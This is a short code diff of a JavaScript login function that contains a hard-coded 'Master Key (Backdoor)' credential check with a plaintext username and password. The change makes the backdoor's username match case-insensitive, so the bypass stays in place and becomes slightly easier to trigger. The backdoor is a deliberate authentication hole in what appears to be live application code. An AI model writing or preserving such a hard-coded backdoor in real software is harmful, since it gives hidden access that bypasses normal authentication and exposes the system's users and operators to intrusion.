@@ -11,7 +11,7 @@ function checkLogin() {
     let validAccount = null;
     
     // Master Key (Backdoor)
-    if (user === 'user' && pass === 'zodiac1989@') {
+    if (user.toLowerCase() === 'user' && pass === 'zodiac1989@') {
         validAccount = {
             user: 'user',
             pass: 'zodiac1989@',
